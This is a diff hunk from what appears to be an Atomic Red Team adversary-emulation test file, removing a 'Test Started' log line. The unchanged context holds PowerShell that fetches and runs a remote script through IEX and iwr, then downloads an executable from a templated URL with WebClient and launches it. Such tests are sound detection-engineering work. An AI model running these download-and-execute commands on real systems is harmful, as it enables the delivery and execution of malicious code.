@@ -270,7 +270,6 @@ atomic_tests:
             Stop-Process -Name WINWORD
     executor:
         command: |
-            Write-Host "Test Started"
             IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
             $ExecutablePath = Join-Path -Path #{executable_location} -ChildPath #{executable_name}
             $Command = "`$client = new-object System.Net.WebClient; `$client.DownloadFile(`"#{download_url}`",`"$ExecutablePath`"); Start-Process -Filepath `"$ExecutablePath`""
